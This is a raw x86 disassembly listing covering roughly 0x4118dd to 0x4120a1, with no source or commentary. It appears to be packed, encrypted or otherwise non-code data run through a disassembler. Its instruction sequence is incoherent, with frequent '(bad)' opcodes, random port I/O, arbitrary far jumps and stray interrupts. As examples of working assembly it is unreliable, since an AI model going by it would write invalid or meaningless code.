  4118dd:	mov    ecx,0xb3bdd4f3
  4118e2:	push   ss
  4118e3:	stos   DWORD PTR es:[edi],eax
  4118e4:	mov    esi,0xd8271047
  4118e9:	gs dec edi
  4118eb:	mov    bl,0x9b
  4118ed:	popa   
  4118ee:	shl    BYTE PTR [eax-0x39],1
  4118f1:	jbe    0x411938
  4118f3:	mov    eax,0xfbab3f9c
  4118f8:	(bad)  
  4118fa:	jmp    0x4118e7
  4118fc:	in     eax,0x77
  4118fe:	push   es
  4118ff:	sar    DWORD PTR [ecx+esi*4],cl
  411902:	adc    BYTE PTR [eax+esi*1+0x3f57ffa1],dl
  411909:	fs inc ebp
  41190b:	xchg   DWORD PTR [eax+edx*2-0x97620cd],ebx
  411912:	cmp    edx,DWORD PTR [ebx]
  411914:	scas   eax,DWORD PTR es:[edi]
  411915:	in     al,0x2b
  411917:	std    
  411918:	test   dh,0xa8
  41191b:	push   ss
  41191c:	jecxz  0x411921
  41191e:	cmp    DWORD PTR [ecx-0x654d51e3],ecx
  411924:	xlat   BYTE PTR ds:[ebx]
  411925:	pusha  
  411926:	stos   BYTE PTR es:[edi],al
  411927:	test   eax,0x17d299f5
  41192c:	out    dx,eax
  41192d:	dec    ebp
  41192e:	jb     0x411916
  411930:	not    BYTE PTR [edx-0x4d]
  411933:	mov    al,0x2f
  411935:	mov    ds:0x9428e9b,eax
  41193a:	or     BYTE PTR [ebp-0x7],cl
  41193d:	hlt    
  41193e:	loopne 0x4119a6
  411940:	out    dx,eax
  411941:	test   esp,esp
  411943:	add    esp,DWORD PTR [ecx+0x51]
  411946:	rol    DWORD PTR [ebx-0xf],1
  411949:	mov    bl,0xfb
  41194b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41194c:	enter  0x9230,0x11
  411950:	call   0xb0afd7ec
  411955:	rcr    DWORD PTR [ecx-0x71382e63],0x83
  41195c:	jns    0x4118e1
  41195e:	int    0x7d
  411960:	jle    0x411914
  411962:	jo     0x4118f6
  411964:	xchg   DWORD PTR [edi],ebx
  411966:	xchg   esi,eax
  411967:	shl    DWORD PTR [edx-0x2c],1
  41196a:	(bad)  [ecx+0x66986e10]
  411970:	push   ebp
  411971:	neg    BYTE PTR [ebp-0x7b33b612]
  411977:	adc    al,0x69
  411979:	adc    edi,eax
  41197b:	xchg   edx,eax
  41197c:	sub    BYTE PTR [ecx-0x44],dl
  41197f:	jnp    0x41199f
  411981:	sbb    DWORD PTR [edi-0x7b461686],esi
  411987:	push   ss
  411988:	lods   al,BYTE PTR ds:[esi]
  411989:	call   0x1c81c266
  41198e:	sbb    dh,bl
  411990:	enter  0x800f,0x4f
  411994:	lods   eax,DWORD PTR ds:[esi]
  411995:	xlat   BYTE PTR ds:[ebx]
  411996:	fidiv  WORD PTR [eax+0x539e51e5]
  41199c:	lods   eax,DWORD PTR ds:[esi]
  41199d:	push   ebx
  41199e:	inc    esi
  41199f:	mov    bh,BYTE PTR cs:[edx]
  4119a2:	mov    ds:0x56f1c999,al
  4119a7:	xchg   esi,eax
  4119a8:	and    al,0xf0
  4119aa:	xor    al,0x2f
  4119ac:	jecxz  0x411961
  4119ae:	and    BYTE PTR [edx-0x4817d555],cl
  4119b4:	in     al,dx
  4119b5:	fsubr  st,st(3)
  4119b7:	mov    esi,0x26a042af
  4119bc:	call   0x775ade74
  4119c1:	ret    
  4119c2:	rol    BYTE PTR [ebx-0x3e9af098],1
  4119c8:	arpl   WORD PTR [esi+eax*1],cx
  4119cb:	mov    ds:0x4010e3a9,al
  4119d0:	mov    ch,0x15
  4119d2:	mov    ebx,0x4157e9fa
  4119d7:	test   edx,esi
  4119d9:	rep stos BYTE PTR es:[edi],al
  4119db:	adc    DWORD PTR ds:0x1c44da4a,eax
  4119e1:	test   eax,0xb0e337a9
  4119e6:	aam    0x72
  4119e8:	mov    ebx,DWORD PTR [eax+0x1b9f5d4e]
  4119ee:	stos   BYTE PTR es:[edi],al
  4119ef:	xlat   BYTE PTR ds:[ebx]
  4119f0:	xchg   ebp,eax
  4119f1:	out    dx,eax
  4119f2:	int    0xe3
  4119f4:	stos   BYTE PTR es:[edi],al
  4119f5:	cmp    ebx,ebp
  4119f7:	push   cs
  4119f8:	jo     0x4119fa
  4119fa:	xchg   edi,eax
  4119fb:	jae    0x4119f6
  4119fd:	jecxz  0x4119ef
  4119ff:	mov    WORD PTR [esi-0x28],cs
  411a02:	rcr    eax,0x14
  411a05:	pop    DWORD PTR [esi-0x6181cf57]
  411a0b:	stc    
  411a0c:	aad    0x9e
  411a0e:	ret    
  411a0f:	jl     0x411a1d
  411a11:	jne    0x411a75
  411a13:	test   al,0xe1
  411a15:	bound  edi,QWORD PTR [ebp-0x77]
  411a18:	or     ebp,DWORD PTR [esi-0x7ee05bea]
  411a1e:	dec    esi
  411a1f:	inc    ebx
  411a20:	aam    0xb3
  411a22:	mov    al,0xe2
  411a24:	xor    eax,DWORD PTR fs:[ebx]
  411a27:	jmp    0x930b:0xf5138b5a
  411a2e:	dec    esp
  411a2f:	gs int 0xef
  411a32:	std    
  411a33:	fstp   TBYTE PTR [esi-0x44af6b10]
  411a39:	(bad)  [esi-0x21]
  411a3c:	addr16 pop es
  411a3e:	fnstsw WORD PTR [esi-0x80]
  411a41:	or     DWORD PTR [ebx-0xd],eax
  411a44:	mov    ecx,0x575bd065
  411a49:	in     al,dx
  411a4a:	jmp    0x4119e0
  411a4c:	or     al,0x26
  411a4e:	mov    BYTE PTR [ebx+edi*4],ah
  411a51:	dec    ebp
  411a52:	ds jl  0x411a8c
  411a55:	(bad)  
  411a56:	xor    al,0xeb
  411a58:	push   ebx
  411a59:	stos   BYTE PTR es:[edi],al
  411a5a:	div    BYTE PTR [edx+0x2b]
  411a5d:	lods   eax,DWORD PTR ds:[esi]
  411a5e:	and    dh,BYTE PTR [edx]
  411a60:	jno    0x411a8a
  411a62:	adc    dh,BYTE PTR [eax+0x3]
  411a65:	xchg   esi,esi
  411a67:	jg     0x411a31
  411a69:	cmp    esi,DWORD PTR [edx-0x169b822f]
  411a6f:	lock jae 0x411a57
  411a72:	xchg   DWORD PTR [edi+0x4a8868b9],ebp
  411a78:	das    
  411a79:	int    0x37
  411a7b:	add    eax,0x80a29012
  411a80:	mov    edx,0x7a5927be
  411a85:	icebp  
  411a86:	ss pop esp
  411a88:	mov    dh,0xde
  411a8a:	lds    esi,FWORD PTR [edi-0x5d]
  411a8d:	push   ss
  411a8e:	adc    ebx,DWORD PTR [edx]
  411a90:	push   es
  411a91:	bound  bx,DWORD PTR [eax]
  411a94:	in     al,0xc0
  411a96:	pop    esp
  411a97:	jo     0x411b14
  411a99:	fwait
  411a9a:	jo     0x411ad6
  411a9c:	int    0xdb
  411a9e:	and    ecx,ecx
  411aa0:	(bad)  
  411aa1:	cmp    DWORD PTR [ecx],ebx
  411aa3:	jp     0x411abd
  411aa5:	out    0x2a,eax
  411aa7:	or     al,0x8
  411aa9:	xor    ecx,edi
  411aab:	cmp    edi,ebp
  411aad:	pop    ds
  411aae:	gs jge 0x411a90
  411ab1:	outs   dx,DWORD PTR ds:[esi]
  411ab2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ab3:	dec    ebx
  411ab4:	in     eax,dx
  411ab5:	ror    bl,1
  411ab7:	and    ebx,edi
  411ab9:	mov    eax,ds:0x3973f5d5
  411abe:	imul   esi,DWORD PTR [edx-0x64],0xffffffd1
  411ac2:	jp     0x411a75
  411ac4:	dec    edi
  411ac5:	fbld   TBYTE PTR [ebx]
  411ac7:	add    al,0x15
  411ac9:	sbb    bh,dh
  411acb:	xor    eax,0x2c5871ed
  411ad0:	mov    BYTE PTR [ebx],0xa9
  411ad3:	cwde   
  411ad4:	mov    ah,0x11
  411ad6:	mov    eax,ds:0x2705e0e7
  411adb:	repnz adc BYTE PTR [edx+0x4e9e703a],ch
  411ae2:	call   0xbbb76637
  411ae7:	jnp    0x411b53
  411ae9:	enter  0xe10d,0x57
  411aed:	imul   DWORD PTR [eax+0x3f857ef5]
  411af3:	iret   
  411af4:	push   es
  411af5:	pop    eax
  411af6:	imul   ecx,DWORD PTR [ebp-0x2370b1f9],0x62
  411afd:	out    0xe8,al
  411aff:	mov    ch,0xd6
  411b01:	push   ecx
  411b02:	ds dec esi
  411b04:	outs   dx,BYTE PTR ds:[esi]
  411b05:	in     eax,0x5a
  411b07:	xor    eax,0xe47698fc
  411b0c:	push   eax
  411b0d:	hlt    
  411b0e:	sbb    ebp,ebp
  411b10:	inc    edi
  411b11:	sbb    eax,0x35555649
  411b16:	mov    gs,WORD PTR [ecx-0x32c473ae]
  411b1c:	add    DWORD PTR [ecx+ebp*4+0xa],ecx
  411b20:	ins    BYTE PTR es:[edi],dx
  411b21:	hlt    
  411b22:	std    
  411b23:	daa    
  411b24:	pop    ecx
  411b25:	aam    0xaf
  411b27:	fadd   st,st(6)
  411b29:	test   al,0xcb
  411b2b:	outs   dx,DWORD PTR ds:[esi]
  411b2c:	in     eax,dx
  411b2d:	loop   0x411b49
  411b2f:	or     dh,ah
  411b31:	and    ah,BYTE PTR [eax+eax*1]
  411b34:	mov    al,0x83
  411b36:	jns    0x411b4c
  411b38:	repz sub DWORD PTR [esi+0xaaaa640],0x76
  411b40:	inc    eax
  411b41:	or     eax,0xc5587c75
  411b46:	mov    dl,0x2c
  411b48:	pop    eax
  411b49:	loopne 0x411bac
  411b4b:	and    eax,0x99e429f2
  411b50:	mov    eax,0x316c9877
  411b55:	data16 loope 0x411adf
  411b58:	lock mov ah,0xec
  411b5b:	ret    
  411b5c:	repnz sbb BYTE PTR gs:[bp+si],ch
  411b61:	mov    dl,0x7e
  411b63:	adc    BYTE PTR [edx+0x507d8b18],ch
  411b69:	arpl   bx,cx
  411b6b:	dec    edx
  411b6c:	rcl    BYTE PTR [edx-0x53],cl
  411b6f:	xchg   ebx,eax
  411b70:	jecxz  0x411b40
  411b72:	inc    ebx
  411b73:	in     eax,dx
  411b74:	mov    BYTE PTR fs:[eax],bl
  411b77:	pop    ecx
  411b78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b79:	cmp    al,0xf3
  411b7b:	cdq    
  411b7c:	jecxz  0x411b83
  411b7e:	in     eax,0xed
  411b80:	test   BYTE PTR [esi],cl
  411b82:	test   ebx,edi
  411b84:	push   es
  411b85:	dec    ebp
  411b86:	js     0x411b90
  411b88:	pusha  
  411b89:	inc    ecx
  411b8a:	retf   
  411b8b:	jecxz  0x411b6a
  411b8d:	mov    ds:0x495b398a,eax
  411b92:	jne    0x411b46
  411b94:	and    DWORD PTR [ebp+0x52],esp
  411b97:	xchg   DWORD PTR [eax],esi
  411b99:	fidiv  DWORD PTR [esi+0x2f101a56]
  411b9f:	(bad)  
  411ba0:	(bad)  
  411ba1:	into   
  411ba2:	jge    0x411bc0
  411ba4:	mov    BYTE PTR [ecx],dh
  411ba6:	(bad)  
  411ba7:	fnsave [ecx+0x3a]
  411baa:	enter  0x3c20,0xd2
  411bae:	sub    BYTE PTR [ecx],bl
  411bb0:	mov    dl,0x83
  411bb2:	rcr    BYTE PTR [ebx],0xe
  411bb5:	inc    esi
  411bb6:	mov    edx,0xf3ff95b3
  411bbb:	das    
  411bbc:	xor    DWORD PTR [ecx-0xd],esp
  411bbf:	add    esi,0xaeb4fa81
  411bc5:	jb     0x411c04
  411bc7:	push   edi
  411bc8:	test   esi,esi
  411bca:	cmp    eax,0x6df413c2
  411bcf:	push   ebx
  411bd0:	ins    BYTE PTR es:[edi],dx
  411bd1:	cmp    al,0x40
  411bd3:	cmp    BYTE PTR [eax+0x5ba84385],dl
  411bd9:	test   al,0x89
  411bdb:	jne    0x411ba4
  411bdd:	aam    0x3f
  411bdf:	retf   
  411be0:	xchg   esi,eax
  411be1:	cdq    
  411be2:	or     ch,0x91
  411be5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411be6:	push   ebx
  411be7:	outs   dx,BYTE PTR ds:[esi]
  411be8:	test   DWORD PTR [edx-0x4d],ecx
  411beb:	stc    
  411bec:	pop    ebp
  411bed:	out    0x96,al
  411bef:	mov    ecx,0x2aa79c0d
  411bf4:	shl    BYTE PTR [ecx-0x6c],1
  411bf7:	fcomp  st(3)
  411bf9:	in     al,0x50
  411bfb:	fdivr  DWORD PTR [edi-0x75]
  411bfe:	or     BYTE PTR [edi],bh
  411c00:	adc    edx,ebp
  411c02:	sti    
  411c03:	jo     0x411beb
  411c05:	ds enter 0xfe18,0x22
  411c0a:	lock pusha 
  411c0c:	xor    eax,0xa63e7b78
  411c11:	in     eax,dx
  411c12:	in     al,0xab
  411c14:	sbb    eax,0x8d44fd0e
  411c19:	pop    edi
  411c1a:	inc    edx
  411c1b:	sbb    ch,BYTE PTR [eax]
  411c1d:	dec    ebp
  411c1e:	mov    dl,0x41
  411c20:	fldcw  WORD PTR [eax-0x68b1a800]
  411c26:	mov    edx,0xa1eeeb82
  411c2b:	rcr    edi,cl
  411c2d:	sub    BYTE PTR [ebx-0x49bd6397],dl
  411c33:	(bad)  [ebx]
  411c35:	mov    ecx,?
  411c37:	sahf   
  411c38:	or     al,0xd8
  411c3a:	nop
  411c3b:	xor    DWORD PTR [eax+0x63fad53d],0x154cf077
  411c45:	xchg   esi,eax
  411c46:	fwait
  411c47:	call   0xf082:0x17dedce9
  411c4e:	sub    al,0xc3
  411c50:	je     0x411c57
  411c52:	or     BYTE PTR [edx],al
  411c54:	add    ebx,DWORD PTR [edi-0x22f5df0a]
  411c5a:	test   BYTE PTR [esi+ebx*4+0x3dfbf4c4],0xdd
  411c62:	sub    eax,0xc92e01d1
  411c67:	mov    ebp,0x22899168
  411c6c:	daa    
  411c6d:	or     eax,DWORD PTR [edi]
  411c6f:	mov    ds:0x78860b8f,eax
  411c74:	cmp    bh,BYTE PTR [edi]
  411c76:	out    dx,eax
  411c77:	mov    esi,0xc3bd6e11
  411c7c:	mov    esi,edx
  411c7e:	int    0xe1
  411c80:	sti    
  411c81:	mov    bl,0xf7
  411c83:	popa   
  411c84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c85:	stos   DWORD PTR es:[edi],eax
  411c86:	rcl    BYTE PTR [bp+si+0xc],0xa3
  411c8b:	in     al,dx
  411c8c:	leave  
  411c8d:	scas   eax,DWORD PTR es:[edi]
  411c8e:	stos   BYTE PTR es:[edi],al
  411c8f:	loopne 0x411c6c
  411c91:	mov    dh,0x6a
  411c93:	cdq    
  411c94:	cs jno 0x411d09
  411c97:	sbb    DWORD PTR [edx],esp
  411c99:	adc    eax,0x13307b4e
  411c9e:	or     al,0x18
  411ca0:	or     eax,0xe58d97f5
  411ca5:	or     al,0xeb
  411ca7:	test   BYTE PTR [edi],bh
  411ca9:	push   esp
  411caa:	lods   al,BYTE PTR ds:[esi]
  411cab:	mov    ah,cl
  411cad:	sbb    ecx,esp
  411caf:	dec    eax
  411cb0:	lock adc al,0xf2
  411cb3:	inc    edi
  411cb4:	jae    0x411c82
  411cb6:	outs   dx,BYTE PTR ds:[esi]
  411cb7:	outs   dx,DWORD PTR ds:[esi]
  411cb8:	das    
  411cb9:	push   0xfa966aa4
  411cbe:	pop    ebx
  411cbf:	sub    esp,DWORD PTR [eax-0x65]
  411cc2:	push   esi
  411cc3:	loopne 0x411cc3
  411cc5:	fidivr WORD PTR [edx-0x29]
  411cc8:	popa   
  411cc9:	cmp    al,0xd
  411ccb:	leave  
  411ccc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ccd:	adc    al,0x77
  411ccf:	ret    0xdd9
  411cd2:	pop    ebp
  411cd3:	adc    DWORD PTR [edi-0xc],ecx
  411cd6:	mov    edx,0xc12a98a5
  411cdb:	cmp    ch,cl
  411cdd:	pop    eax
  411cde:	sbb    eax,0x38a54124
  411ce3:	jns    0x411cee
  411ce5:	popa   
  411ce6:	stc    
  411ce7:	and    dl,BYTE PTR [edi+0x64015b30]
  411ced:	int    0x44
  411cef:	pop    es
  411cf0:	mov    ebx,0x963c17c2
  411cf5:	neg    DWORD PTR [esi+0x226b1b54]
  411cfb:	push   edx
  411cfc:	cld    
  411cfd:	cmc    
  411cfe:	mov    al,0xc0
  411d00:	dec    esp
  411d01:	add    DWORD PTR [eax-0x3e],esp
  411d04:	or     DWORD PTR [eax],0xdc552dac
  411d0a:	cmp    ebp,DWORD PTR [edi+0x552c2caa]
  411d10:	mov    edx,0x3b897858
  411d15:	lahf   
  411d16:	push   esi
  411d17:	mov    bl,0x6f
  411d19:	ja     0x411cae
  411d1b:	adc    BYTE PTR [ebx-0x586bcac9],al
  411d21:	sbb    esi,DWORD PTR [edx-0x4e]
  411d24:	sub    DWORD PTR [ecx-0x12689221],0x39
  411d2b:	idiv   DWORD PTR [ebx]
  411d2d:	cmp    DWORD PTR [eax-0x7b],ecx
  411d30:	mov    esi,0x3f2b8d98
  411d35:	pop    ds
  411d36:	xchg   edi,eax
  411d37:	(bad)  
  411d38:	rcl    dl,1
  411d3a:	or     esi,DWORD PTR ds:0x86a55e2d
  411d40:	sbb    al,0x23
  411d42:	xor    al,0x3e
  411d44:	sub    DWORD PTR [edx-0x6a],edx
  411d47:	sbb    DWORD PTR [esi+0x61],ecx
  411d4a:	mov    esp,0x2de61d9f
  411d4f:	sub    edi,DWORD PTR fs:[edi+0x2f76c9fe]
  411d56:	clc    
  411d57:	int3   
  411d58:	imul   ebp,DWORD PTR [eax-0x165120ed],0x7feb448e
  411d62:	sbb    esi,DWORD PTR [edi]
  411d64:	xor    ah,BYTE PTR [ebp-0x1de1b391]
  411d6a:	pop    es
  411d6b:	pop    ss
  411d6c:	mov    bl,0x10
  411d6e:	fnstenv [eax]
  411d70:	daa    
  411d71:	dec    ebx
  411d72:	ins    DWORD PTR es:[edi],dx
  411d73:	mul    DWORD PTR [edi+0x24f3c9c2]
  411d79:	ja     0x411cfb
  411d7b:	add    dl,al
  411d7d:	inc    ebx
  411d7e:	inc    ebp
  411d7f:	pop    ecx
  411d80:	ss repnz mov ebp,0xab88d0ac
  411d87:	imul   ebx,DWORD PTR [eax-0x775571d7],0xe0fa7233
  411d91:	sub    al,0xb3
  411d93:	xchg   edi,eax
  411d94:	xchg   edi,eax
  411d95:	retf   
  411d96:	ror    DWORD PTR [edx-0x1d],0x7f
  411d9a:	push   ecx
  411d9b:	push   ss
  411d9c:	(bad)  
  411d9d:	iret   
  411d9e:	sbb    DWORD PTR [edx+0x2700ea08],esp
  411da4:	fs fwait
  411da6:	stos   DWORD PTR es:[edi],eax
  411da7:	popa   
  411da8:	mov    dh,0xed
  411daa:	inc    ecx
  411dab:	int3   
  411dac:	outs   dx,BYTE PTR ds:[esi]
  411dad:	in     al,0x91
  411daf:	scas   al,BYTE PTR es:[edi]
  411db0:	pop    ds
  411db1:	in     eax,0x21
  411db3:	(bad)  
  411db5:	call   0x2274:0x64a544ee
  411dbc:	outs   dx,DWORD PTR ds:[esi]
  411dbd:	out    dx,al
  411dbe:	lahf   
  411dbf:	sahf   
  411dc0:	ret    0xb35c
  411dc3:	fidivr WORD PTR [esi-0x663c12ec]
  411dc9:	lfs    edx,FWORD PTR [edx+0x320db508]
  411dd0:	ret    
  411dd1:	xor    eax,0xde323237
  411dd6:	and    BYTE PTR [edx-0x4883a209],bl
  411ddc:	mov    dl,0x7a
  411dde:	jo     0x411dfa
  411de0:	mov    WORD PTR [edi+0xef1ba56],es
  411de6:	cmp    BYTE PTR [ebx+0x453ae785],ch
  411dec:	mov    ds:0x966a1525,al
  411df1:	jnp    0x411e11
  411df3:	in     eax,0x70
  411df5:	or     ebp,DWORD PTR [esp+esi*8]
  411df8:	jle    0x411e56
  411dfa:	sbb    BYTE PTR [edi-0x5303721e],dh
  411e00:	push   es
  411e01:	nop
  411e02:	int3   
  411e03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e04:	xor    ebp,DWORD PTR [ebx+0x7f]
  411e07:	inc    ebx
  411e08:	icebp  
  411e09:	inc    esp
  411e0a:	mov    edx,0xeb544d79
  411e0f:	lods   eax,DWORD PTR es:[esi]
  411e11:	xchg   ecx,eax
  411e12:	test   ch,cl
  411e14:	leave  
  411e15:	addr16 (bad) 
  411e17:	leave  
  411e18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e19:	jmp    0x58c9:0x111848c2
  411e20:	pushf  
  411e21:	xlat   BYTE PTR ds:[ebx]
  411e22:	push   ebx
  411e23:	push   esp
  411e24:	mov    dh,0x92
  411e26:	sbb    ebx,ecx
  411e28:	sbb    DWORD PTR [edi-0x61],0xb40878da
  411e2f:	(bad)  
  411e30:	scas   al,BYTE PTR es:[edi]
  411e31:	fsubr  QWORD PTR [ebp-0x4cb34ae7]
  411e37:	sub    DWORD PTR [ecx],ebx
  411e39:	les    edi,FWORD PTR [ebp-0x2c864200]
  411e3f:	sar    DWORD PTR [ebp-0x67a184e5],cl
  411e45:	out    dx,eax
  411e46:	dec    eax
  411e47:	xchg   bl,bh
  411e49:	ja     0x411ec6
  411e4b:	mov    eax,ds:0xedaea06f
  411e50:	pop    eax
  411e51:	push   ebp
  411e52:	jns    0x411e25
  411e54:	jb     0x411e6f
  411e56:	mov    DWORD PTR [ebp-0x3d5bbba0],ebx
  411e5c:	mov    es,esp
  411e5e:	dec    esi
  411e5f:	pop    es
  411e60:	out    dx,eax
  411e61:	cdq    
  411e62:	loope  0x411eb4
  411e64:	jns    0x411dff
  411e66:	fistp  WORD PTR [ebp-0x68]
  411e69:	push   ss
  411e6a:	sub    esp,DWORD PTR [edi-0x5e150aad]
  411e70:	and    BYTE PTR [edx],cl
  411e72:	xchg   edx,eax
  411e73:	je     0x411ed3
  411e75:	in     eax,0x39
  411e77:	out    0xa7,al
  411e79:	push   edi
  411e7a:	jmp    0xbf11e214
  411e7f:	std    
  411e80:	jo     0x411ec5
  411e82:	jp     0x411eb8
  411e84:	rcr    eax,0xce
  411e87:	push   edx
  411e88:	or     ah,BYTE PTR [ebx+esi*4]
  411e8b:	out    0xb1,al
  411e8d:	xchg   ebx,eax
  411e8e:	mov    edi,0x29244dd3
  411e93:	stos   BYTE PTR es:[edi],al
  411e94:	cld    
  411e95:	fstp   DWORD PTR [edi]
  411e97:	sti    
  411e98:	imul   ebp,DWORD PTR [esi],0x5b03aa56
  411e9e:	fldcw  WORD PTR [eax+0x1004b4f1]
  411ea4:	js     0x411e32
  411ea6:	jge    0x411f08
  411ea8:	sahf   
  411ea9:	mov    ah,0x51
  411eab:	(bad)  
  411eac:	psubsb mm4,QWORD PTR [ebx-0x13]
  411eb0:	and    bl,ch
  411eb2:	xchg   edx,eax
  411eb3:	or     eax,DWORD PTR [edx+ebp*1]
  411eb6:	mov    WORD PTR [ebx-0x1d1f3c57],es
  411ebc:	or     esi,0x4
  411ebf:	(bad)  
  411ec0:	or     al,0x8f
  411ec2:	mov    esi,0x786131a0
  411ec7:	pusha  
  411ec8:	test   eax,0xc5bad2b5
  411ecd:	test   eax,0xf741f52b
  411ed2:	push   ebp
  411ed3:	(bad)  
  411ed4:	lds    esi,FWORD PTR [ecx]
  411ed6:	dec    esi
  411ed7:	outs   dx,DWORD PTR ds:[esi]
  411ed8:	and    DWORD PTR [edx-0x1ec2b85e],esp
  411ede:	mov    esp,0x1d56caf5
  411ee3:	and    ah,BYTE PTR [ebx-0x37]
  411ee6:	iret   
  411ee7:	hlt    
  411ee8:	call   0x784a:0xb4655dc5
  411eef:	out    dx,eax
  411ef0:	or     al,0xab
  411ef2:	mov    dh,0x96
  411ef4:	imul   ecx,DWORD PTR [eax+eiz*1],0x15f5b873
  411efb:	push   0xffffff8d
  411efd:	push   0xffffff97
  411eff:	push   es
  411f00:	pop    ecx
  411f01:	jno    0x411f69
  411f03:	xchg   DWORD PTR [ebx-0x2c37f3b8],esp
  411f09:	test   DWORD PTR [eax+0x5dcc52ca],ebx
  411f0f:	test   eax,0xcc9a97fa
  411f14:	sahf   
  411f15:	test   esi,0x34dc9deb
  411f1b:	jl     0x411ea9
  411f1d:	lahf   
  411f1e:	push   esp
  411f1f:	dec    ebx
  411f20:	sub    al,0xe3
  411f22:	xor    cl,dl
  411f24:	and    al,0x7d
  411f26:	aam    0x6a
  411f28:	push   0xb935a16c
  411f2d:	pop    ds
  411f2e:	int3   
  411f2f:	push   0xede79bc0
  411f34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f35:	scas   al,BYTE PTR es:[edi]
  411f36:	sub    ch,cl
  411f38:	mov    edx,0x9d51468e
  411f3d:	inc    esp
  411f3e:	lods   al,BYTE PTR ds:[esi]
  411f3f:	stos   BYTE PTR es:[edi],al
  411f40:	stc    
  411f41:	popf   
  411f42:	mov    dh,dh
  411f44:	out    dx,al
  411f45:	idiv   DWORD PTR [edi-0x63]
  411f48:	int    0x50
  411f4a:	ror    edi,0x8d
  411f4d:	xor    BYTE PTR ds:0x12a8b612,ah
  411f53:	xchg   BYTE PTR [edx+ecx*8-0x6bb466d4],al
  411f5a:	stc    
  411f5b:	mov    edx,DWORD PTR [ebx*4+0x56129e90]
  411f62:	leave  
  411f63:	push   cs
  411f64:	fistp  DWORD PTR [ebp+0x4c]
  411f67:	call   0x1f2c09b4
  411f6c:	test   al,0xb3
  411f6e:	jbe    0x411fe9
  411f70:	push   ds
  411f71:	adc    dh,BYTE PTR [eax]
  411f73:	test   DWORD PTR [esi-0x7b],ecx
  411f76:	adc    al,ah
  411f78:	mov    BYTE PTR [ebx],bh
  411f7a:	sti    
  411f7b:	pop    esp
  411f7c:	popa   
  411f7d:	test   edx,ebx
  411f7f:	pop    eax
  411f80:	les    eax,FWORD PTR [eax+0x38]
  411f83:	mov    ebx,0x623e4589
  411f88:	xor    esi,edi
  411f8a:	mov    bl,0xb2
  411f8c:	(bad)  
  411f8d:	xor    BYTE PTR [eax+0x43],ah
  411f90:	repnz sahf 
  411f92:	pop    ds
  411f93:	mov    ds:0xb8940a88,eax
  411f98:	jge    0x411fcf
  411f9a:	and    BYTE PTR [edx+0x567a2101],dh
  411fa0:	rcl    BYTE PTR [ebx],0x40
  411fa3:	mov    ds,WORD PTR [ecx+edx*8]
  411fa6:	mov    gs,WORD PTR [eax]
  411fa8:	sar    bl,0x89
  411fab:	inc    edx
  411fac:	popf   
  411fad:	or     eax,0x7432b451
  411fb2:	repnz popa 
  411fb4:	outs   dx,BYTE PTR ds:[esi]
  411fb5:	stos   DWORD PTR es:[edi],eax
  411fb6:	fisub  DWORD PTR [ebp+0x64]
  411fb9:	inc    esp
  411fba:	pop    ecx
  411fbb:	jmp    0x8b02:0xc7b38d2
  411fc2:	icebp  
  411fc3:	enter  0x5add,0xd2
  411fc7:	sbb    ecx,DWORD PTR [ecx-0x61b48a6e]
  411fcd:	mov    eax,ds:0x1bf37285
  411fd2:	mov    esp,0xfdc4a557
  411fd7:	inc    edx
  411fd8:	ret    
  411fd9:	push   es
  411fda:	dec    edx
  411fdb:	pop    esp
  411fdc:	clc    
  411fdd:	add    al,0x5f
  411fdf:	lea    edx,[ebx-0x5c]
  411fe2:	xchg   esi,eax
  411fe3:	mov    ds:0xa3773ad4,al
  411fe8:	lahf   
  411fe9:	xchg   edi,eax
  411fea:	and    DWORD PTR [edx],ebp
  411fec:	xchg   esi,eax
  411fed:	mov    esi,0x3e38b204
  411ff2:	loop   0x412019
  411ff4:	cmp    ah,BYTE PTR [edx-0x64be5998]
  411ffa:	mov    ebp,0xb017b3ed
  411fff:	jl     0x412077
  412001:	push   esi
  412002:	icebp  
  412003:	xchg   edi,eax
  412004:	lahf   
  412005:	xchg   esi,eax
  412006:	jle    0x412076
  412008:	call   0xf8d0631e
  41200d:	push   es
  41200e:	inc    edi
  41200f:	clc    
  412010:	dec    esi
  412011:	inc    esi
  412012:	jo     0x411ff6
  412014:	mov    cl,0x85
  412016:	in     eax,0x38
  412018:	push   0xa83fe2db
  41201d:	push   0x8971df21
  412022:	add    cl,bh
  412024:	stos   BYTE PTR es:[edi],al
  412025:	push   esi
  412026:	lahf   
  412027:	inc    ebp
  412028:	inc    edi
  412029:	inc    edi
  41202a:	je     0x412044
  41202c:	cmp    esp,0x26b0b815
  412032:	push   edi
  412033:	stos   BYTE PTR es:[edi],al
  412034:	jl     0x41204f
  412036:	or     BYTE PTR [esi-0x2b],ch
  412039:	in     eax,0x7
  41203b:	pop    eax
  41203c:	adc    dl,BYTE PTR [ebx+0x22]
  41203f:	ja     0x412080
  412041:	cmp    ebp,ecx
  412043:	cmp    eax,edi
  412045:	cmp    al,BYTE PTR [edi+0x2912d988]
  41204b:	mov    edx,0x713ae29a
  412050:	or     BYTE PTR [esi],bh
  412052:	scas   eax,DWORD PTR es:[edi]
  412053:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412054:	out    0x29,al
  412056:	jmp    0xacd0:0x3b078208
  41205d:	dec    ebp
  41205e:	jp     0x41201c
  412060:	call   0x78e2b03b
  412065:	lods   eax,DWORD PTR ds:[esi]
  412066:	lea    esp,[edi-0x3a0e644d]
  41206c:	mov    edi,0x3dec940
  412071:	pop    es
  412072:	push   esp
  412073:	mov    ah,ah
  412075:	cld    
  412076:	lds    ebp,FWORD PTR [esi-0x6d]
  412079:	(bad)  
  41207a:	cdq    
  41207b:	add    edi,esp
  41207d:	loopne 0x412071
  41207f:	imul   ecx,DWORD PTR [ebx+0x7a926442],0x9
  412086:	xchg   ebp,eax
  412087:	cmp    DWORD PTR [edx-0x27b547cb],ecx
  41208d:	mov    al,0x5
  41208f:	fcom   QWORD PTR [ebp-0x1c1c38cc]
  412095:	jb     0x4120b6
  412097:	out    dx,al
  412098:	arpl   WORD PTR [esi-0x15579ebd],bx
  41209e:	xchg   esp,eax
  41209f:	out    0xbe,eax
  4120a1:	and    al,0x75
